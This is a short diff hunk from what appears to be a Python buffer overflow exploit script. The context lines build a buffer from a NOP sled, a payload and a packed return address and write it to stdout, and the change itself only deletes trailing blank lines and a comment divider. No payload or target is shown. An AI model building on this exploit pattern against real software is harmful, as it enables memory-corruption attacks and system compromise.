@@ -230,12 +230,3 @@ buf = ('\x90' * (buf_len - len(payload))) + payload + struct.pack('<L', ret_addr
 
 # writing to the shell
 sys.stdout.write(buf)
-
-
-// --------------------------------------------- //
-
-
-
-
-
-
